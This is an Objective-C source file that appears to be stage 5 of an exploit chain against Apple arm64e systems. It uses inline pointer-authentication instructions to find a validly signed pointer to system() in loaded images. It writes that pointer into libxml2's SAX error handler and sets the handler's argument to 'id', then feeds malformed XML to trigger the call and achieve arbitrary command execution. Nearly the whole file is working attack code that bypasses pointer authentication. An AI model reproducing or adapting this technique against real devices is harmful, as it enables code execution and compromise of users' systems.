/*
 * stage5_blraaz_ace.m — SEC-TX-01 Stage 5: SAX error handler → system() ACE
 *
 * Uses inline asm (xpaci/autia) instead of __builtin_ptrauth_strip
 * so it compiles on both arm64 and arm64e targets.
 *
 * Build: clang -fobjc-arc -framework Foundation -lxml2
 *        -I$(xcrun --show-sdk-path)/usr/include/libxml2
 *        -o stage5 stage5_blraaz_ace.m
 */
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <mach/mach.h>
#import <stdio.h>
#import <string.h>
#import <stdint.h>
#import <libxml/parser.h>
#import <libxml/tree.h>

static uint64_t strip_pac(uint64_t ptr) {
    uint64_t result;
    __asm__ volatile(
        "mov x16, %1\n"
        "xpaci x16\n"
        "mov %0, x16\n"
        : "=r"(result) : "r"(ptr) : "x16");
    return result;
}

static uint64_t autia_zero(uint64_t ptr) {
    uint64_t result;
    __asm__ volatile(
        "mov x16, %1\n"
        "mov x17, xzr\n"
        "autia x16, x17\n"
        "mov %0, x16\n"
        : "=r"(result) : "r"(ptr) : "x16", "x17");
    return result;
}

static uint64_t find_ia_zero_signed_ptr(const char *func_name) {
    void *func = dlsym(RTLD_DEFAULT, func_name);
    if (!func) return 0;

    uint64_t target_stripped = strip_pac((uint64_t)func);
    printf("  Looking for %s (stripped: 0x%llx)\n",
           func_name, (unsigned long long)target_stripped);

    for (uint32_t img = 0; img < _dyld_image_count(); img++) {
        const struct mach_header_64 *mh =
            (const struct mach_header_64 *)_dyld_get_image_header(img);
        intptr_t slide = _dyld_get_image_vmaddr_slide(img);
        if (!mh || mh->magic != MH_MAGIC_64) continue;

        const uint8_t *ptr = (const uint8_t *)(mh + 1);
        for (uint32_t c = 0; c < mh->ncmds; c++) {
            const struct load_command *lc = (void *)ptr;
            if (lc->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (void *)ptr;
                if (seg->vmsize == 0 || !(seg->initprot & VM_PROT_WRITE)) {
                    ptr += lc->cmdsize;
                    continue;
                }
                uint64_t *data = (uint64_t *)(seg->vmaddr + slide);
                size_t count = (size_t)seg->vmsize / sizeof(uint64_t);
                for (size_t i = 0; i < count; i++) {
                    uint64_t val = data[i];
                    if (val == 0) continue;
                    uint64_t stripped = strip_pac(val);
                    if (stripped == target_stripped) {
                        printf("  FOUND at %p: raw=0x%016llx\n",
                               &data[i], (unsigned long long)val);

                        uint64_t authed = autia_zero(val);
                        int valid = (authed == stripped);
                        printf("  autia(val,0) = 0x%llx → %s\n",
                               (unsigned long long)authed,
                               valid ? "PASS" : "FAIL");
                        if (valid) return val;
                    }
                }
            }
            ptr += lc->cmdsize;
        }
    }
    return 0;
}

static void silent_err(void *ctx, const char *msg, ...) { (void)ctx; (void)msg; }

int main(void) {
    @autoreleasepool {
        printf("\n");
        printf("  Stage 5: SAX Error Handler → system() ACE\n\n");

        system("true");

        printf("=== Locate signed system() ===\n");
        uint64_t signed_system = find_ia_zero_signed_ptr("system");

        if (signed_system == 0) {
            printf("  ERROR: Could not find valid system()\n");
            return 1;
        }

        printf("\n=== Write to SAX error handler ===\n");
        xmlInitParser();
        xmlParserCtxtPtr ctxt = xmlNewParserCtxt();

        printf("  ctxt->sax = %p\n", ctxt->sax);
        printf("  sax->error (before): 0x%016llx\n",
               (unsigned long long)*(uint64_t *)((char *)ctxt->sax + 176));

        uint64_t *error_slot = (uint64_t *)((char *)ctxt->sax + 176);
        memcpy(error_slot, &signed_system, sizeof(uint64_t));
        ctxt->userData = (void *)"id";

        printf("  sax->error (after):  0x%016llx\n",
               (unsigned long long)*error_slot);
        printf("  userData: \"%s\"\n\n", (char *)ctxt->userData);

        printf("=== Trigger parse error ===\n");
        printf("  ─── output ───\n  ");
        fflush(stdout);
        fflush(stderr);

        xmlDocPtr doc = xmlCtxtReadMemory(ctxt, "<<<INVALID>>>", 14,
                                          "trigger.xml", NULL, 0);
        if (doc) xmlFreeDoc(doc);

        printf("\n  ─── end ───\n\n");

        ctxt->sax->error = silent_err;
        ctxt->userData = ctxt;
        xmlFreeParserCtxt(ctxt);
        xmlCleanupParser();
    }
    return 0;
}
